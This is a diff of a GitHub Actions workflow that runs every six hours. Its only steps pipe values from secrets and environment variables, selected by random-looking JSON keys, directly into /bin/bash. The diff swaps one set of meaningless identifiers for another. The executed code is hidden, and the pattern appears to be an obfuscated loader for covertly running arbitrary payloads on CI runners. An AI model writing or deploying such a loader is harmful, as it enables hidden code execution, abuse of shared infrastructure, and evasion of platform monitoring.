@@ -3,27 +3,22 @@ name: labubuae
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 3/6 * * *'
+    - cron: '52 2/6 * * *'
 
-jobs:  # 25351
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: labubuae
         env:
-          gzjn346: ${{ secrets.gzjn346 }}
+          y362: ${{ secrets.y362 }}
         run: |
-          echo $gzjn346 | jq -r .coehw9972 | /bin/bash
-          echo $bzv95 | jq -r .wcmo629 | /bin/bash
-          echo $tmz1658 | jq -r .vef055 | /bin/bash
-          echo $p0071 | jq -r .bpcoc5080 | /bin/bash
-          echo $j2155 | jq -r .u67724 | /bin/bash
-          echo $cbc2743 | jq -r .xar2 | /bin/bash
-          echo $uh9580 | jq -r .dkayi670 | /bin/bash
-          echo $zljs2607 | jq -r .whf39844 | /bin/bash
-          echo $g7 | jq -r .algnj7485 | /bin/bash
-          echo $ylzd51180 | jq -r .lnz68707 | /bin/bash
-          echo $radm567 | jq -r .jzl3187 | /bin/bash
+          echo $y362 | jq -r .y64374 | /bin/bash
+          echo $g79 | jq -r .fvkst12 | /bin/bash
+          echo $gyqrn26643 | jq -r .prcjo41376 | /bin/bash
+          echo $fwqon00 | jq -r .ua58059 | /bin/bash
+          echo $s5 | jq -r .xrwr684 | /bin/bash
+          echo $pvai329 | jq -r .ltlrq46148 | /bin/bash
+          echo $m3762 | jq -r .zxpv2879 | /bin/bash
 
